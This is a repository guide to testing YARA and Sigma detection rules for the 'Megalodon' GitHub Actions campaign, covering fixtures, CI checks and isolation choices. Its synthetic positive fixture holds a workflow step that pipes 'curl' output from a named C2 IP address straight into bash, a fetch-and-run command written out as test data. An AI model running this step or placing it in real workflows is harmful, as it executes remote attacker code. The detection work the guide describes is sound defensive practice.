# Testing Detection Rules

All rules in this repository must pass testing before publication. This document describes the safe testing procedure for YARA and Sigma rules and the fixture conventions we use.

No rule merges to `main` without a passing test record. The CI pipeline enforces compile/lint checks; fixture testing is a manual gate documented here.

---

## Safe YARA testing principles

The primary risk when testing detection rules is accidentally executing or exposing malicious content. Our testing approach uses three safety principles:

1. **Synthetic fixtures only** — never commit real malware samples; create files that contain only the specific IoC string or pattern under test, with no executable payload
2. **Isolated environment** — run tests on a machine not connected to production systems, or within a dedicated testing directory with no write-back to sensitive locations
3. **Scan files, not processes** — YARA scans byte patterns in files; it does not execute them; scanning a file that contains a C2 IP string cannot cause that connection to be made

### Legitimate safe-testing tools and services

| Tool / Service | Use | Notes |
|---|---|---|
| **Arya** (by VirusTotal) | Generates benign pseudo-malicious files that match specific YARA rule patterns | Safe: generates files designed to trigger detection logic without executing code; use for positive fixture generation |
| **YARA Scan Service** (abuse.ch) | Web-based scanning against large malware databases | Safe for rule validation against real samples without local malware handling; requires uploading the rule, not the sample |
| **YARA Playground** (Intezer) | Client-side browser-based scanning | Rule and sample stay local; useful for quick validation |
| **NIST NSRL** (National Software Reference Library) | Large collection of known-good files | Use for negative fixture validation at scale — confirms rules do not fire on legitimate software |
| **Panopticon** | YARA rule performance testing | Measures execution speed against a sample set; use before publishing to confirm no regex/wildcard performance issue |
| **CIRCL yara-validator** | Syntax + semantic validation beyond compile check | Catches issues that `yara <file> /dev/null` misses |

For the Megalodon campaign specifically: fixtures are GitHub Actions YAML files. These are text files — there is no execution risk scanning them with YARA. Synthetic fixtures are appropriate and sufficient.

---

## YARA testing

### Install

```bash
# macOS
brew install yara

# Ubuntu / Debian
sudo apt-get install yara

# From source (latest)
# https://yara.readthedocs.io/en/latest/gettingstarted.html
```

### Compile check (automated in CI)

Before anything else, verify the rule file compiles:

```bash
yara megalodon/yara/megalodon-workflow.yar /dev/null
```

`/dev/null` is an empty scan target — this exercises the compiler without needing real files. A clean return (exit 0, no output) means the rule is syntactically valid. The CI pipeline runs this check on every PR.

### Performance check

Before running full fixture tests, confirm the rules do not have regex patterns that could cause catastrophic backtracking or excessive execution time:

```bash
# Time the compile-and-scan over a realistic sample set (positive + negative fixtures)
time yara -r megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/

# Flag if any single scan takes >1s — investigate the rule's regex patterns
```

Avoid:
- Unbounded wildcards in string patterns (`/.*foo.*/` — prefer specific anchors)
- Excessive `#` (occurrence count) conditions on wide string matches
- Nested quantifiers in regular expressions

### Positive fixture testing

A positive fixture is a file that the rule **must** match. Place fixtures under `tests/<campaign>/fixtures/positive/`.

```bash
# Run against positive fixtures — every file must produce at least one match
yara megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/positive/
```

**Fixture strategy — Megalodon:** All Megalodon IoCs appear in GitHub Actions YAML files (text). Synthetic fixtures are created for each distinct IoC. No real malware handling is needed.

**Synthetic fixture example** — testing `Megalodon_Workflow_C2_IP`:

```yaml
# tests/megalodon/fixtures/positive/synthetic-c2-ip.yml
# Synthetic fixture: contains only the C2 IP string; no live payload; not a functional workflow
name: Optimize-Build
on: workflow_dispatch
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: curl -s http://216.126.225.129:8443/payload | bash
```

Each synthetic fixture must contain **only** the IoC pattern being tested — not a working copy of the full malicious workflow. The goal is to confirm the rule pattern matches the IoC string, not to recreate the attack.

### Negative fixture testing

A negative fixture is a benign file that the rule **must not** match. Place fixtures under `tests/<campaign>/fixtures/negative/`.

```bash
# Every file must produce zero matches
yara megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/negative/
```

Negative fixtures are where false positive risk surfaces. Use real-world benign workflow files that share surface-level similarity with the campaign IoCs:

- Legitimate workflows that use `workflow_dispatch`
- Legitimate workflows that use `base64` for encoding (not for piping to shell)
- Legitimate workflows that use `id-token: write` for standard OIDC auth (not combined with `pull_request_target`)
- Common GitHub Actions from public repos: `actions/checkout`, `actions/setup-node`, deployment workflows

Source benign workflows from: your own repos, GitHub's official Actions, published open-source CI templates.

### False positive risk assessment

Before marking a rule tested, explicitly document:

1. What benign conditions share surface similarity with the IoC
2. How many negative fixtures you tested
3. Whether any adjustments to the rule were needed to eliminate false positives

If a rule fires on benign content, narrow it with additional conditions or string anchors rather than publishing a noisy rule.

### Recording results

Document the test outcome in the rule's `meta` block:

```yara
meta:
    tested              = "2026-05-30"
    positive_count      = "3"
    negative_count      = "12"
    false_positives     = "None observed in test set of 12 benign workflow files"
```

---

## Sigma testing

### Install sigma-cli

```bash
pip install sigma-cli
```

### Lint check (automated in CI)

```bash
sigma check megalodon/sigma/megalodon-github-direct-push-workflow.yml
```

All errors must be resolved before merging. Warnings should be reviewed and either resolved or explicitly documented.

### Required fields

Every Sigma rule must include all of these fields before it can be promoted from `status: test` to `status: stable`:

| Field | Requirement |
|---|---|
| `id` | UUID4 — generate with `python3 -c "import uuid; print(uuid.uuid4())"` |
| `status` | `test` on first publish; `stable` once validated against live log data |
| `author` | Author name or team |
| `date` | ISO 8601 date (`YYYY-MM-DD`) |
| `references` | At least one external source for the detection logic |
| `tags` | At least one ATT&CK tag (`attack.t1234` format) |
| `level` | `critical` / `high` / `medium` / `low` / `informational` |
| `falsepositives` | Honest list of known benign triggers — never just `None` if benign triggers exist |
| `logsource` | Product, category, and/or service |
| `detection` | Selection conditions and filter conditions |

### SIEM backend validation

Before publishing, convert to at least one SIEM target and verify the output is syntactically valid:

```bash
# Convert to Splunk SPL
sigma convert -t splunk megalodon/sigma/megalodon-github-direct-push-workflow.yml

# Convert to Elasticsearch EQL
sigma convert -t elasticsearch megalodon/sigma/megalodon-github-direct-push-workflow.yml

# Convert to Microsoft Sentinel KQL
sigma convert -t sentinel megalodon/sigma/megalodon-github-direct-push-workflow.yml
```

Correct any conversion warnings before marking the rule `status: stable`.

### Log validation

Where real or representative log data is available, run the converted query against it to verify:

1. The rule fires on logs matching the threat scenario (true positive)
2. The rule does not fire on normal operational logs (true negative)

Document the log source used and the outcome in the `falsepositives` and any `notes` field.

---

## Fixture organisation

```
tests/
└── <campaign>/
    └── fixtures/
        ├── positive/          # Files the rule must match
        │   ├── synthetic-<rule-name>.yml
        │   └── synthetic-<ioc-variant>.yml
        └── negative/          # Files the rule must not match
            ├── benign-<scenario>.yml
            └── ...
```

Name fixtures descriptively: `synthetic-c2-ip.yml`, `synthetic-base64-payload.yml`, `benign-workflow-dispatch.yml`. The name must communicate what the fixture tests.

**Synthetic fixture rules:**
- Contains only the specific IoC string or pattern — not a full working exploit
- Has a comment at the top explaining what it is and why it is safe
- Is a text file format (YAML, JSON, shell) where possible — avoids binary handling complexity
- Never contains credentials, tokens, or real attack infrastructure data beyond what is documented in public threat intelligence

---

## Docker test environment (recommended)

Running tests inside a Docker container provides:
- Isolation from the host — scanning synthetic fixtures in a container cannot affect the host system
- Consistent YARA version across macOS, Linux, and Windows machines
- No local YARA install required on developer machines
- Reproducible results for CI

### Container setup

Create a `tests/Dockerfile` (included in this repo):

```dockerfile
FROM ubuntu:24.04
RUN apt-get update && apt-get install -y --no-install-recommends yara && rm -rf /var/lib/apt/lists/*
WORKDIR /rules
ENTRYPOINT ["yara"]
```

Build once:

```bash
docker build -t detection-rules-yara tests/
```

### Running tests with Docker

Mount the repo root as a read-only volume. Results stream to stdout on the host.

```bash
# Compile check
docker run --rm -v "$(pwd)":/rules:ro detection-rules-yara \
  megalodon/yara/megalodon-workflow.yar /dev/null

# Positive fixtures — all must match
docker run --rm -v "$(pwd)":/rules:ro detection-rules-yara \
  megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/positive/

# Negative fixtures — zero matches expected
docker run --rm -v "$(pwd)":/rules:ro detection-rules-yara \
  megalodon/yara/megalodon-workflow.yar tests/megalodon/fixtures/negative/
```

Mount is read-only (`:ro`) — the container cannot write back to the host. Fixtures are text files (YAML) with no executable content, so container isolation is belt-and-suspenders for this campaign.

### Docker vs VM — choosing the right isolation level

| Isolation method | Kernel | Network | Snapshot/rollback | Appropriate for |
|---|---|---|---|---|
| **Local (no isolation)** | Shared host | Shared host | No | Synthetic text fixtures only (no risk) |
| **Docker container** | Shared host kernel | Isolated (by default) | No (use image rebuild) | Synthetic fixtures; benign sample validation; CI pipelines |
| **Virtual machine** | Separate kernel | Isolated with virtual NIC | Yes — snapshot before, rollback after | Real malware samples (binaries, executables, live payloads) |

**The critical distinction:** Docker shares the host kernel. A kernel-level exploit in malware could escape a container and reach the host. A VM runs its own kernel — a kernel exploit cannot reach the host without a separate hypervisor breakout (a much higher bar). For our use case:

- Scanning synthetic YAML fixtures with YARA → local or Docker is fine; the fixtures cannot execute anything
- Scanning binary malware samples → use a VM with network isolation and a snapshot taken before scanning; revert to snapshot after

For Megalodon (GitHub Actions YAML only): Docker is sufficient. If the repo ever covers binary malware payloads, upgrade the procedure to VM-based analysis.

### When Docker is overkill

For GitHub Actions YAML fixture testing specifically, container isolation is optional — the fixtures contain no executable content and YARA cannot cause a YAML file to execute. Local YARA testing is acceptable for workflow-based campaigns where all fixtures are text files. Use Docker when:
- Fixtures include binary files or script content
- You want a clean reproducible record for CI
- The machine does not have a local YARA install

---

## Validating rules against external malware databases

For rule validation beyond synthetic fixtures (particularly to catch false positives at scale), these services let you test without handling malware locally:

**YARA Scan Service (abuse.ch):** Upload your rule; the service scans it against a database of known malware samples and returns matches. Does not require uploading a sample — your rule is the input.

**Intezer YARA Playground:** Client-side, browser-based. Upload rule and a sample; everything stays local. Useful for spot-checking rules against a sample you have already safely characterised.

Do not upload rules containing proprietary intelligence (unpublished IoCs, internal network indicators) to third-party scanning services.

---

## Other rule formats — future consideration

YARA and Sigma are the primary formats in this repository. Additional formats under consideration for future campaigns:

| Format | Use case | Status |
|---|---|---|
| **Suricata** | Network-based detection — complements Sigma network rules with inline IDS/IPS enforcement | Planned |
| **STIX 2.1** | Structured threat intelligence sharing — campaign IoC bundles consumable by threat intel platforms | Planned |
| **KQL** | Microsoft Sentinel native — sigma-cli generates KQL from Sigma rules; standalone KQL considered if Sigma conversion is lossy | Under review |

Suricata rules would be placed in `<campaign>/suricata/<campaign>-<subject>.rules`. Testing: `suricata -T -c /etc/suricata/suricata.yaml -S <file.rules>` for syntax validation; pcap replay against a packet capture containing the attack traffic for functional testing.

---

*See [`CONTRIBUTING.md`](CONTRIBUTING.md) for the full rule quality gate and pull request process.*
